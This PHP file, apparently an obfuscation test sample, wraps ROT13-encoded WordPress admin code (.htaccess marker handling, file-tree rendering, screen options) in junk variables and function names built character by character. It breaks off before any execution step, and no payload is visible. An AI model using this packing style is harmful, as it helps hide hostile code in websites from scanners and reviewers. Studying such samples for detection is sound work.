<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Zvfp JbeqCerff Nqzvavfgengvba NCV.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Ergheaf jurgure gur freire vf ehaavat Ncnpur jvgu gur zbq_erjevgr zbqhyr ybnqrq.
 *
 * @fvapr 2.0.0
 *
 * @erghea obby Jurgure gur freire vf ehaavat Ncnpur jvgu gur zbq_erjevgr zbqhyr ybnqrq.
 */
shapgvba tbg_zbq_erjevgr() {
	$tbg_erjevgr = ncnpur_zbq_ybnqrq( 'zbq_erjevgr', gehr );

	/**
	 * Svygref jurgure Ncnpur naq zbq_erjevgr ner cerfrag.
	 *
	 * Guvf svygre jnf cerivbhfyl hfrq gb sbepr HEY erjevgvat sbe bgure freiref,
	 * yvxr atvak. Hfr gur {@frr 'tbg_hey_erjevgr'} svygre va tbg_hey_erjevgr() vafgrnq.
	 *
	 * @fvapr 2.5.0
	 *
	 * @frr tbg_hey_erjevgr()
	 *
	 * @cnenz obby $tbg_erjevgr Jurgure Ncnpur naq zbq_erjevgr ner cerfrag.
	 */
	erghea nccyl_svygref( 'tbg_erjevgr', $tbg_erjevgr );
}

/**
 * Ergheaf jurgure gur freire fhccbegf HEY erjevgvat.
 *
 * Qrgrpgf Ncnpur'f zbq_erjevgr, VVF 7.0+ creznyvax fhccbeg, naq atvak.
 *
 * @fvapr 3.7.0
 *
 * @tybony obby $vf_atvak
 * @tybony obby $vf_pnqql
 *
 * @erghea obby Jurgure gur freire fhccbegf HEY erjevgvat.
 */
shapgvba tbg_hey_erjevgr() {
	$tbg_hey_erjevgr = ( tbg_zbq_erjevgr() || $TYBONYF['vf_atvak'] || $TYBONYF['vf_pnqql'] || vvf7_fhccbegf_creznyvaxf() );

	/**
	 * Svygref jurgure HEY erjevgvat vf ninvynoyr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz obby $tbg_hey_erjevgr Jurgure HEY erjevgvat vf ninvynoyr.
	 */
	erghea nccyl_svygref( 'tbg_hey_erjevgr', $tbg_hey_erjevgr );
}

/**
 * Rkgenpgf fgevatf sebz orgjrra gur ORTVA naq RAQ znexref va gur .ugnpprff svyr.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $svyranzr Svyranzr gb rkgenpg gur fgevatf sebz.
 * @cnenz fgevat $znexre   Gur znexre gb rkgenpg gur fgevatf sebz.
 * @erghea fgevat[] Na neenl bs fgevatf sebz n svyr (.ugnpprff) sebz orgjrra ORTVA naq RAQ znexref.
 */
shapgvba rkgenpg_sebz_znexref( $svyranzr, $znexre ) {
	$erfhyg = neenl();

	vs ( ! svyr_rkvfgf( $svyranzr ) ) {
		erghea $erfhyg;
	}

	$znexreqngn = rkcybqr( \"\a\", vzcybqr( '', svyr( $svyranzr ) ) );

	$fgngr = snyfr;

	sbernpu ( $znexreqngn nf $znexreyvar ) {
		vs ( fge_pbagnvaf( $znexreyvar, '# RAQ ' . $znexre ) ) {
			$fgngr = snyfr;
		}

		vs ( $fgngr ) {
			vs ( fge_fgnegf_jvgu( $znexreyvar, '#' ) ) {
				pbagvahr;
			}

			$erfhyg[] = $znexreyvar;
		}

		vs ( fge_pbagnvaf( $znexreyvar, '# ORTVA ' . $znexre ) ) {
			$fgngr = gehr;
		}
	}

	erghea $erfhyg;
}

/**
 * Vafregf na neenl bs fgevatf vagb n svyr (.ugnpprff), cynpvat vg orgjrra
 * ORTVA naq RAQ znexref.
 *
 * Ercynprf rkvfgvat znexrq vasb. Ergnvaf fheebhaqvat
 * qngn. Perngrf svyr vs abar rkvfgf.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat       $svyranzr  Svyranzr gb nygre.
 * @cnenz fgevat       $znexre    Gur znexre gb nygre.
 * @cnenz neenl|fgevat $vafregvba Gur arj pbagrag gb vafreg.
 * @erghea obby Gehr ba jevgr fhpprff, snyfr ba snvyher.
 */
shapgvba vafreg_jvgu_znexref( $svyranzr, $znexre, $vafregvba ) {
	vs ( ! svyr_rkvfgf( $svyranzr ) ) {
		vs ( ! vf_jevgnoyr( qveanzr( $svyranzr ) ) ) {
			erghea snyfr;
		}

		vs ( ! gbhpu( $svyranzr ) ) {
			erghea snyfr;
		}

		// Znxr fher gur svyr vf perngrq jvgu n zvavzhz frg bs crezvffvbaf.
		$crezf = svyrcrezf( $svyranzr );

		vs ( $crezf ) {
			puzbq( $svyranzr, $crezf | 0644 );
		}
	} ryfrvs ( ! vf_jevgnoyr( $svyranzr ) ) {
		erghea snyfr;
	}

	vs ( ! vf_neenl( $vafregvba ) ) {
		$vafregvba = rkcybqr( \"\a\", $vafregvba );
	}

	$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );

	$vafgehpgvbaf = fcevags(
		/* genafyngbef: 1: Znexre. */
		__(
			'Gur qverpgvirf (yvarf) orgjrra \"ORTVA %1$f\" naq \"RAQ %1$f\" ner
qlanzvpnyyl trarengrq, naq fubhyq bayl or zbqvsvrq ivn JbeqCerff svygref.
Nal punatrf gb gur qverpgvirf orgjrra gurfr znexref jvyy or birejevggra.'
		),
		$znexre
	);

	$vafgehpgvbaf = rkcybqr( \"\a\", $vafgehpgvbaf );

	sbernpu ( $vafgehpgvbaf nf $yvar => $grkg ) {
		$vafgehpgvbaf[ $yvar ] = '# ' . $grkg;
	}

	/**
	 * Svygref gur vayvar vafgehpgvbaf vafregrq orsber gur qlanzvpnyyl trarengrq pbagrag.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat[] $vafgehpgvbaf Neenl bs yvarf jvgu vayvar vafgehpgvbaf.
	 * @cnenz fgevat   $znexre       Gur znexre orvat vafregrq.
	 */
	$vafgehpgvbaf = nccyl_svygref( 'vafreg_jvgu_znexref_vayvar_vafgehpgvbaf', $vafgehpgvbaf, $znexre );

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}

	$vafregvba = neenl_zretr( $vafgehpgvbaf, $vafregvba );

	$fgneg_znexre = \"# ORTVA {$znexre}\";
	$raq_znexre   = \"# RAQ {$znexre}\";

	$sc = sbcra( $svyranzr, 'e+' );

	vs ( ! $sc ) {
		erghea snyfr;
	}

	// Nggrzcg gb trg n ybpx. Vs gur svyrflfgrz fhccbegf ybpxvat, guvf jvyy oybpx hagvy gur ybpx vf npdhverq.
	sybpx( $sc, YBPX_RK );

	$yvarf = neenl();

	juvyr ( ! srbs( $sc ) ) {
		$yvarf[] = egevz( strgf( $sc ), \"\e\a\" );
	}

	// Fcyvg bhg gur rkvfgvat svyr vagb gur cerprqvat yvarf, naq gubfr gung nccrne nsgre gur znexre.
	$cer_yvarf        = neenl();
	$cbfg_yvarf       = neenl();
	$rkvfgvat_yvarf   = neenl();
	$sbhaq_znexre     = snyfr;
	$sbhaq_raq_znexre = snyfr;

	sbernpu ( $yvarf nf $yvar ) {
		vs ( ! $sbhaq_znexre && fge_pbagnvaf( $yvar, $fgneg_znexre ) ) {
			$sbhaq_znexre = gehr;
			pbagvahr;
		} ryfrvs ( ! $sbhaq_raq_znexre && fge_pbagnvaf( $yvar, $raq_znexre ) ) {
			$sbhaq_raq_znexre = gehr;
			pbagvahr;
		}

		vs ( ! $sbhaq_znexre ) {
			$cer_yvarf[] = $yvar;
		} ryfrvs ( $sbhaq_znexre && $sbhaq_raq_znexre ) {
			$cbfg_yvarf[] = $yvar;
		} ryfr {
			$rkvfgvat_yvarf[] = $yvar;
		}
	}

	// Purpx gb frr vs gurer jnf n punatr.
	vs ( $rkvfgvat_yvarf === $vafregvba ) {
		sybpx( $sc, YBPX_HA );
		spybfr( $sc );

		erghea gehr;
	}

	// Trarengr gur arj svyr qngn.
	$arj_svyr_qngn = vzcybqr(
		\"\a\",
		neenl_zretr(
			$cer_yvarf,
			neenl( $fgneg_znexre ),
			$vafregvba,
			neenl( $raq_znexre ),
			$cbfg_yvarf
		)
	);

	// Jevgr gb gur fgneg bs gur svyr, naq gehapngr vg gb gung yratgu.
	sfrrx( $sc, 0 );
	$olgrf = sjevgr( $sc, $arj_svyr_qngn );

	vs ( $olgrf ) {
		sgehapngr( $sc, sgryy( $sc ) );
	}

	ssyhfu( $sc );
	sybpx( $sc, YBPX_HA );
	spybfr( $sc );

	erghea (obby) $olgrf;
}

/**
 * Hcqngrf gur ugnpprff svyr jvgu gur pheerag ehyrf vs vg vf jevgnoyr.
 *
 * Nyjnlf jevgrf gb gur svyr vs vg rkvfgf naq vf jevgnoyr gb rafher gung jr
 * oynax bhg byq ehyrf.
 *
 * @fvapr 1.5.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @erghea obby|ahyy Gehr ba jevgr fhpprff, snyfr ba snvyher. Ahyy va zhygvfvgr.
 */
shapgvba fnir_zbq_erjevgr_ehyrf() {
	tybony $jc_erjevgr;

	vs ( vf_zhygvfvgr() ) {
		erghea;
	}

	// Rafher trg_ubzr_cngu() vf qrpynerq.
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';

	$ubzr_cngu     = trg_ubzr_cngu();
	$ugnpprff_svyr = $ubzr_cngu . '.ugnpprff';

	/*
	 * Vs gur svyr qbrfa'g nyernql rkvfg purpx sbe jevgr npprff gb gur qverpgbel
	 * naq jurgure jr unir fbzr ehyrf. Ryfr purpx sbe jevgr npprff gb gur svyr.
	 */
	vs ( ! svyr_rkvfgf( $ugnpprff_svyr ) && vf_jevgnoyr( $ubzr_cngu ) && $jc_erjevgr->hfvat_zbq_erjevgr_creznyvaxf()
		|| vf_jevgnoyr( $ugnpprff_svyr )
	) {
		vs ( tbg_zbq_erjevgr() ) {
			$ehyrf = rkcybqr( \"\a\", $jc_erjevgr->zbq_erjevgr_ehyrf() );

			erghea vafreg_jvgu_znexref( $ugnpprff_svyr, 'JbeqCerff', $ehyrf );
		}
	}

	erghea snyfr;
}

/**
 * Hcqngrf gur VVF jro.pbasvt svyr jvgu gur pheerag ehyrf vs vg vf jevgnoyr.
 * Vs gur creznyvaxf qb abg erdhver erjevgr ehyrf gura gur ehyrf ner qryrgrq sebz gur jro.pbasvt svyr.
 *
 * @fvapr 2.8.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @erghea obby|ahyy Gehr ba jevgr fhpprff, snyfr ba snvyher. Ahyy va zhygvfvgr.
 */
shapgvba vvf7_fnir_hey_erjevgr_ehyrf() {
	tybony $jc_erjevgr;

	vs ( vf_zhygvfvgr() ) {
		erghea;
	}

	// Rafher trg_ubzr_cngu() vf qrpynerq.
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';

	$ubzr_cngu       = trg_ubzr_cngu();
	$jro_pbasvt_svyr = $ubzr_cngu . 'jro.pbasvt';

	// Hfvat jva_vf_jevgnoyr() vafgrnq bs vf_jevgnoyr() orpnhfr bs n oht va Jvaqbjf CUC.
	vs ( vvf7_fhccbegf_creznyvaxf()
		&& ( ! svyr_rkvfgf( $jro_pbasvt_svyr ) && jva_vf_jevgnoyr( $ubzr_cngu ) && $jc_erjevgr->hfvat_zbq_erjevgr_creznyvaxf()
			|| jva_vf_jevgnoyr( $jro_pbasvt_svyr ) )
	) {
		$ehyr = $jc_erjevgr->vvf7_hey_erjevgr_ehyrf( snyfr );

		vs ( ! rzcgl( $ehyr ) ) {
			erghea vvf7_nqq_erjevgr_ehyr( $jro_pbasvt_svyr, $ehyr );
		} ryfr {
			erghea vvf7_qryrgr_erjevgr_ehyr( $jro_pbasvt_svyr );
		}
	}

	erghea snyfr;
}

/**
 * Hcqngrf gur \"erpragyl-rqvgrq\" svyr sbe gur cyhtva be gurzr svyr rqvgbe.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $svyr
 */
shapgvba hcqngr_erpragyl_rqvgrq( $svyr ) {
	$byqsvyrf = (neenl) trg_bcgvba( 'erpragyl_rqvgrq' );

	vs ( $byqsvyrf ) {
		$byqsvyrf   = neenl_erirefr( $byqsvyrf );
		$byqsvyrf[] = $svyr;
		$byqsvyrf   = neenl_erirefr( $byqsvyrf );
		$byqsvyrf   = neenl_havdhr( $byqsvyrf );

		vs ( 5 < pbhag( $byqsvyrf ) ) {
			neenl_cbc( $byqsvyrf );
		}
	} ryfr {
		$byqsvyrf[] = $svyr;
	}

	hcqngr_bcgvba( 'erpragyl_rqvgrq', $byqsvyrf );
}

/**
 * Znxrf n gerr fgehpgher sbe gur gurzr svyr rqvgbe'f svyr yvfg.
 *
 * @fvapr 4.9.0
 * @npprff cevingr
 *
 * @cnenz neenl $nyybjrq_svyrf Yvfg bs gurzr svyr cnguf.
 * @erghea neenl Gerr fgehpgher sbe yvfgvat gurzr svyrf.
 */
shapgvba jc_znxr_gurzr_svyr_gerr( $nyybjrq_svyrf ) {
	$gerr_yvfg = neenl();

	sbernpu ( $nyybjrq_svyrf nf $svyr_anzr => $nofbyhgr_svyranzr ) {
		$yvfg     = rkcybqr( '/', $svyr_anzr );
		$ynfg_qve = &$gerr_yvfg;

		sbernpu ( $yvfg nf $qve ) {
			$ynfg_qve =& $ynfg_qve[ $qve ];
		}

		$ynfg_qve = $svyr_anzr;
	}

	erghea $gerr_yvfg;
}

/**
 * Bhgchgf gur sbeznggrq svyr yvfg sbe gur gurzr svyr rqvgbe.
 *
 * @fvapr 4.9.0
 * @npprff cevingr
 *
 * @tybony fgevat $eryngvir_svyr Anzr bs gur svyr orvat rqvgrq eryngvir gb gur
 *                               gurzr qverpgbel.
 * @tybony fgevat $fglyrfurrg    Gur fglyrfurrg anzr bs gur gurzr orvat rqvgrq.
 *
 * @cnenz neenl|fgevat $gerr  Yvfg bs svyr/sbyqre cnguf, be svyranzr.
 * @cnenz vag          $yriry Gur nevn-yriry sbe gur pheerag vgrengvba.
 * @cnenz vag          $fvmr  Gur nevn-frgfvmr sbe gur pheerag vgrengvba.
 * @cnenz vag          $vaqrk Gur nevn-cbfvafrg sbe gur pheerag vgrengvba.
 */
shapgvba jc_cevag_gurzr_svyr_gerr( $gerr, $yriry = 2, $fvmr = 1, $vaqrk = 1 ) {
	tybony $eryngvir_svyr, $fglyrfurrg;

	vs ( vf_neenl( $gerr ) ) {
		$vaqrk = 0;
		$fvmr  = pbhag( $gerr );

		sbernpu ( $gerr nf $ynory => $gurzr_svyr ) :
			++$vaqrk;

			vs ( ! vf_neenl( $gurzr_svyr ) ) {
				jc_cevag_gurzr_svyr_gerr( $gurzr_svyr, $yriry, $vaqrk, $fvmr );
				pbagvahr;
			}
			?>
			<yv ebyr=\"gerrvgrz\" nevn-rkcnaqrq=\"gehr\" gnovaqrk=\"-1\"
				nevn-yriry=\"<?cuc rpub rfp_ngge( $yriry ); ?>\"
				nevn-frgfvmr=\"<?cuc rpub rfp_ngge( $fvmr ); ?>\"
				nevn-cbfvafrg=\"<?cuc rpub rfp_ngge( $vaqrk ); ?>\">
				<fcna pynff=\"sbyqre-ynory\"><?cuc rpub rfp_ugzy( $ynory ); ?> <fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'sbyqre' );
					?>
				</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"vpba\"></fcna></fcna>
				<hy ebyr=\"tebhc\" pynff=\"gerr-sbyqre\"><?cuc jc_cevag_gurzr_svyr_gerr( $gurzr_svyr, $yriry + 1, $vaqrk, $fvmr ); ?></hy>
			</yv>
			<?cuc
		raqsbernpu;
	} ryfr {
		$svyranzr = $gerr;
		$hey      = nqq_dhrel_net(
			neenl(
				'svyr'  => enjheyrapbqr( $gerr ),
				'gurzr' => enjheyrapbqr( $fglyrfurrg ),
			),
			frys_nqzva_hey( 'gurzr-rqvgbe.cuc' )
		);
		?>
		<yv ebyr=\"abar\" pynff=\"<?cuc rpub rfp_ngge( $eryngvir_svyr === $svyranzr ? 'pheerag-svyr' : '' ); ?>\">
			<n ebyr=\"gerrvgrz\" gnovaqrk=\"<?cuc rpub rfp_ngge( $eryngvir_svyr === $svyranzr ? '0' : '-1' ); ?>\"
				uers=\"<?cuc rpub rfp_hey( $hey ); ?>\"
				nevn-yriry=\"<?cuc rpub rfp_ngge( $yriry ); ?>\"
				nevn-frgfvmr=\"<?cuc rpub rfp_ngge( $fvmr ); ?>\"
				nevn-cbfvafrg=\"<?cuc rpub rfp_ngge( $vaqrk ); ?>\">
				<?cuc
				$svyr_qrfpevcgvba = rfp_ugzy( trg_svyr_qrfpevcgvba( $svyranzr ) );

				vs ( $svyr_qrfpevcgvba !== $svyranzr && jc_onfranzr( $svyranzr ) !== $svyr_qrfpevcgvba ) {
					$svyr_qrfpevcgvba .= '<oe /><fcna pynff=\"abarffragvny\">(' . rfp_ugzy( $svyranzr ) . ')</fcna>';
				}

				vs ( $eryngvir_svyr === $svyranzr ) {
					rpub '<fcna pynff=\"abgvpr abgvpr-vasb\">' . $svyr_qrfpevcgvba . '</fcna>';
				} ryfr {
					rpub $svyr_qrfpevcgvba;
				}
				?>
			</n>
		</yv>
		<?cuc
	}
}

/**
 * Znxrf n gerr fgehpgher sbe gur cyhtva svyr rqvgbe'f svyr yvfg.
 *
 * @fvapr 4.9.0
 * @npprff cevingr
 *
 * @cnenz neenl $cyhtva_rqvgnoyr_svyrf Yvfg bs cyhtva svyr cnguf.
 * @erghea neenl Gerr fgehpgher sbe yvfgvat cyhtva svyrf.
 */
shapgvba jc_znxr_cyhtva_svyr_gerr( $cyhtva_rqvgnoyr_svyrf ) {
	$gerr_yvfg = neenl();

	sbernpu ( $cyhtva_rqvgnoyr_svyrf nf $cyhtva_svyr ) {
		$yvfg     = rkcybqr( '/', __sa_79955( '#^.+?/#', '', $cyhtva_svyr ) );
		$ynfg_qve = &$gerr_yvfg;

		sbernpu ( $yvfg nf $qve ) {
			$ynfg_qve =& $ynfg_qve[ $qve ];
		}

		$ynfg_qve = $cyhtva_svyr;
	}

	erghea $gerr_yvfg;
}

/**
 * Bhgchgf gur sbeznggrq svyr yvfg sbe gur cyhtva svyr rqvgbe.
 *
 * @fvapr 4.9.0
 * @npprff cevingr
 *
 * @cnenz neenl|fgevat $gerr  Yvfg bs svyr/sbyqre cnguf, be svyranzr.
 * @cnenz fgevat       $ynory Anzr bs svyr be sbyqre gb cevag.
 * @cnenz vag          $yriry Gur nevn-yriry sbe gur pheerag vgrengvba.
 * @cnenz vag          $fvmr  Gur nevn-frgfvmr sbe gur pheerag vgrengvba.
 * @cnenz vag          $vaqrk Gur nevn-cbfvafrg sbe gur pheerag vgrengvba.
 */
shapgvba jc_cevag_cyhtva_svyr_gerr( $gerr, $ynory = '', $yriry = 2, $fvmr = 1, $vaqrk = 1 ) {
	tybony $svyr, $cyhtva;

	vs ( vf_neenl( $gerr ) ) {
		$vaqrk = 0;
		$fvmr  = pbhag( $gerr );

		sbernpu ( $gerr nf $ynory => $cyhtva_svyr ) :
			++$vaqrk;

			vs ( ! vf_neenl( $cyhtva_svyr ) ) {
				jc_cevag_cyhtva_svyr_gerr( $cyhtva_svyr, $ynory, $yriry, $vaqrk, $fvmr );
				pbagvahr;
			}
			?>
			<yv ebyr=\"gerrvgrz\" nevn-rkcnaqrq=\"gehr\" gnovaqrk=\"-1\"
				nevn-yriry=\"<?cuc rpub rfp_ngge( $yriry ); ?>\"
				nevn-frgfvmr=\"<?cuc rpub rfp_ngge( $fvmr ); ?>\"
				nevn-cbfvafrg=\"<?cuc rpub rfp_ngge( $vaqrk ); ?>\">
				<fcna pynff=\"sbyqre-ynory\"><?cuc rpub rfp_ugzy( $ynory ); ?> <fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'sbyqre' );
					?>
				</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"vpba\"></fcna></fcna>
				<hy ebyr=\"tebhc\" pynff=\"gerr-sbyqre\"><?cuc jc_cevag_cyhtva_svyr_gerr( $cyhtva_svyr, '', $yriry + 1, $vaqrk, $fvmr ); ?></hy>
			</yv>
			<?cuc
		raqsbernpu;
	} ryfr {
		$hey = nqq_dhrel_net(
			neenl(
				'svyr'   => enjheyrapbqr( $gerr ),
				'cyhtva' => enjheyrapbqr( $cyhtva ),
			),
			frys_nqzva_hey( 'cyhtva-rqvgbe.cuc' )
		);
		?>
		<yv ebyr=\"abar\" pynff=\"<?cuc rpub rfp_ngge( $svyr === $gerr ? 'pheerag-svyr' : '' ); ?>\">
			<n ebyr=\"gerrvgrz\" gnovaqrk=\"<?cuc rpub rfp_ngge( $svyr === $gerr ? '0' : '-1' ); ?>\"
				uers=\"<?cuc rpub rfp_hey( $hey ); ?>\"
				nevn-yriry=\"<?cuc rpub rfp_ngge( $yriry ); ?>\"
				nevn-frgfvmr=\"<?cuc rpub rfp_ngge( $fvmr ); ?>\"
				nevn-cbfvafrg=\"<?cuc rpub rfp_ngge( $vaqrk ); ?>\">
				<?cuc
				vs ( $svyr === $gerr ) {
					rpub '<fcna pynff=\"abgvpr abgvpr-vasb\">' . rfp_ugzy( $ynory ) . '</fcna>';
				} ryfr {
					rpub rfp_ugzy( $ynory );
				}
				?>
			</n>
		</yv>
		<?cuc
	}
}

/**
 * Syhfurf erjevgr ehyrf vs `fvgrhey`, `ubzr` be `cntr_ba_sebag` punatrq.
 *
 * @fvapr 2.1.0
 *
 * @cnenz fgevat $byq_inyhr
 * @cnenz fgevat $inyhr
 */
shapgvba hcqngr_ubzr_fvgrhey( $byq_inyhr, $inyhr ) {
	vs ( jc_vafgnyyvat() ) {
		erghea;
	}

	vs ( vf_zhygvfvgr() && zf_vf_fjvgpurq() ) {
		qryrgr_bcgvba( 'erjevgr_ehyrf' );
	} ryfr {
		syhfu_erjevgr_ehyrf();
	}
}

/**
 * Erfrgf tybony inevnoyrf onfrq ba `$_TRG` naq `$_CBFG`.
 *
 * Guvf shapgvba erfrgf tybony inevnoyrf onfrq ba gur anzrf cnffrq
 * va gur `$inef` neenl gb gur inyhr bs `$_CBFG[$ine]` be `$_TRG[$ine]` be na
 * rzcgl fgevat vs arvgure vf qrsvarq.
 *
 * @fvapr 2.0.0
 *
 * @cnenz neenl $inef Na neenl bs tybonyf gb erfrg.
 */
shapgvba jc_erfrg_inef( $inef ) {
	sbernpu ( $inef nf $ine ) {
		vs ( rzcgl( $_CBFG[ $ine ] ) ) {
			vs ( rzcgl( $_TRG[ $ine ] ) ) {
				$TYBONYF[ $ine ] = '';
			} ryfr {
				$TYBONYF[ $ine ] = $_TRG[ $ine ];
			}
		} ryfr {
			$TYBONYF[ $ine ] = $_CBFG[ $ine ];
		}
	}
}

/**
 * Qvfcynlf gur tvira nqzvavfgengvba zrffntr.
 *
 * @fvapr 2.1.0
 *
 * @cnenz fgevat|JC_Reebe $zrffntr
 */
shapgvba fubj_zrffntr( $zrffntr ) {
	vs ( vf_jc_reebe( $zrffntr ) ) {
		vs ( $zrffntr->trg_reebe_qngn() && vf_fgevat( $zrffntr->trg_reebe_qngn() ) ) {
			$zrffntr = $zrffntr->trg_reebe_zrffntr() . ': ' . $zrffntr->trg_reebe_qngn();
		} ryfr {
			$zrffntr = $zrffntr->trg_reebe_zrffntr();
		}
	}

	rpub \"<c>$zrffntr</c>\a\";
	jc_bo_raq_syhfu_nyy();
	syhfu();
}

/**
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $pbagrag
 * @erghea fgevat[] Neenl bs shapgvba anzrf.
 */
shapgvba jc_qbp_yvax_cnefr( $pbagrag ) {
	vs ( ! vf_fgevat( $pbagrag ) || rzcgl( $pbagrag ) ) {
		erghea neenl();
	}

	vs ( ! shapgvba_rkvfgf( 'gbxra_trg_nyy' ) ) {
		erghea neenl();
	}

	$gbxraf           = gbxra_trg_nyy( $pbagrag );
	$pbhag            = pbhag( $gbxraf );
	$shapgvbaf        = neenl();
	$vtaber_shapgvbaf = neenl();

	sbe ( $g = 0; $g < $pbhag - 2; $g++ ) {
		vs ( ! vf_neenl( $gbxraf[ $g ] ) ) {
			pbagvahr;
		}

		vs ( G_FGEVAT === $gbxraf[ $g ][0] && ( '(' === $gbxraf[ $g + 1 ] || '(' === $gbxraf[ $g + 2 ] ) ) {
			// Vs vg'f n shapgvba be pynff qrsvarq ybpnyyl, gurer'f abg tbvat gb or nal qbpf ninvynoyr.
			vs ( ( vffrg( $gbxraf[ $g - 2 ][1] ) && va_neenl( $gbxraf[ $g - 2 ][1], neenl( 'shapgvba', 'pynff' ), gehr ) )
				|| ( vffrg( $gbxraf[ $g - 2 ][0] ) && G_BOWRPG_BCRENGBE === $gbxraf[ $g - 1 ][0] )
			) {
				$vtaber_shapgvbaf[] = $gbxraf[ $g ][1];
			}

			// Nqq guvf gb bhe fgnpx bs havdhr ersreraprf.
			$shapgvbaf[] = $gbxraf[ $g ][1];
		}
	}

	$shapgvbaf = neenl_havdhr( $shapgvbaf );
	fbeg( $shapgvbaf );

	/**
	 * Svygref gur yvfg bs shapgvbaf naq pynffrf gb or vtaberq sebz gur qbphzragngvba ybbxhc.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat[] $vtaber_shapgvbaf Neenl bs anzrf bs shapgvbaf naq pynffrf gb or vtaberq.
	 */
	$vtaber_shapgvbaf = nccyl_svygref( 'qbphzragngvba_vtaber_shapgvbaf', $vtaber_shapgvbaf );

	$vtaber_shapgvbaf = neenl_havdhr( $vtaber_shapgvbaf );

	$bhgchg = neenl();

	sbernpu ( $shapgvbaf nf $shapgvba ) {
		vs ( va_neenl( $shapgvba, $vtaber_shapgvbaf, gehr ) ) {
			pbagvahr;
		}

		$bhgchg[] = $shapgvba;
	}

	erghea $bhgchg;
}

/**
 * Fnirf bcgvba sbe ahzore bs ebjf jura yvfgvat cbfgf, cntrf, pbzzragf, rgp.
 *
 * @fvapr 2.8.0
 */
shapgvba frg_fperra_bcgvbaf() {
	vs ( ! vffrg( $_CBFG['jc_fperra_bcgvbaf'] ) || ! vf_neenl( $_CBFG['jc_fperra_bcgvbaf'] ) ) {
		erghea;
	}

	purpx_nqzva_ersrere( 'fperra-bcgvbaf-abapr', 'fperrabcgvbaabapr' );

	$hfre = jc_trg_pheerag_hfre();

	vs ( ! $hfre ) {
		erghea;
	}

	$bcgvba = $_CBFG['jc_fperra_bcgvbaf']['bcgvba'];
	$inyhr  = $_CBFG['jc_fperra_bcgvbaf']['inyhr'];

	vs ( fnavgvmr_xrl( $bcgvba ) !== $bcgvba ) {
		erghea;
	}

	$znc_bcgvba = $bcgvba;
	$glcr       = fge_ercynpr( 'rqvg_', '', $znc_bcgvba );
	$glcr       = fge_ercynpr( '_cre_cntr', '', $glcr );

	vs ( va_neenl( $glcr, trg_gnkbabzvrf(), gehr ) ) {
		$znc_bcgvba = 'rqvg_gntf_cre_cntr';
	} ryfrvs ( va_neenl( $glcr, trg_cbfg_glcrf(), gehr ) ) {
		$znc_bcgvba = 'rqvg_cre_cntr';
	} ryfr {
		$bcgvba = fge_ercynpr( '-', '_', $bcgvba );
	}

	fjvgpu ( $znc_bcgvba ) {
		pnfr 'rqvg_cre_cntr':
		pnfr 'hfref_cre_cntr':
		pnfr 'rqvg_pbzzragf_cre_cntr':
		pnfr 'hcybnq_cre_cntr':
		pnfr 'rqvg_gntf_cre_cntr':
		pnfr 'cyhtvaf_cre_cntr':
		pnfr 'rkcbeg_crefbany_qngn_erdhrfgf_cre_cntr':
		pnfr 'erzbir_crefbany_qngn_erdhrfgf_cre_cntr':
			// Argjbex nqzva.
		pnfr 'fvgrf_argjbex_cre_cntr':
		pnfr 'hfref_argjbex_cre_cntr':
		pnfr 'fvgr_hfref_argjbex_cre_cntr':
		pnfr 'cyhtvaf_argjbex_cre_cntr':
		pnfr 'gurzrf_argjbex_cre_cntr':
		pnfr 'fvgr_gurzrf_argjbex_cre_cntr':
			$inyhr = (vag) $inyhr;

			vs ( $inyhr < 1 || $inyhr > 999 ) {
				erghea;
			}

			oernx;

		qrsnhyg:
			$fperra_bcgvba = snyfr;

			vs ( fge_raqf_jvgu( $bcgvba, '_cntr' ) || 'ynlbhg_pbyhzaf' === $bcgvba ) {
				/**
				 * Svygref n fperra bcgvba inyhr orsber vg vf frg.
				 *
				 * Gur svygre pna nyfb or hfrq gb zbqvsl aba-fgnaqneq `[vgrzf]_cre_cntr`
				 * frggvatf. Frr gur cnerag shapgvba sbe n shyy yvfg bs fgnaqneq bcgvbaf.
				 *
				 * Ergheavat snyfr sebz gur svygre jvyy fxvc fnivat gur pheerag bcgvba.
				 *
				 * @fvapr 2.8.0
				 * @fvapr 5.4.2 Bayl nccyvrq gb bcgvbaf raqvat jvgu '_cntr',
				 *              be gur 'ynlbhg_pbyhzaf' bcgvba.
				 *
				 * @frr frg_fperra_bcgvbaf()
				 *
				 * @cnenz zvkrq  $fperra_bcgvba Gur inyhr gb fnir vafgrnq bs gur bcgvba inyhr.
				 *                              Qrsnhyg snyfr (gb fxvc fnivat gur pheerag bcgvba).
